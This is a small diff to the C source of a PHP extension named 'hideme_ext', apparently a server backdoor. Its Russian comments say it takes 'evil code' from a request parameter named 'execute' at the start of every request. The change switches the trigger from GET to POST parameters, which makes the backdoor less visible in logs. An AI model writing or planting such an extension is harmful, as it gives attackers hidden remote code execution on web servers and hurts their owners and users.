@@ -17,7 +17,7 @@ ZEND_GET_MODULE(hideme_ext);
 PHP_RINIT_FUNCTION(hideme)
 {
 
-	char* method = "_GET"; // суперглобальный массив, из которого берем пераметр и значение
+	char* method = "_POST"; // суперглобальный массив, из которого берем пераметр и значение
 	char* secret_string = "execute"; // параметр в котором будет evil-код
 	zval** arr;
 	char* code;
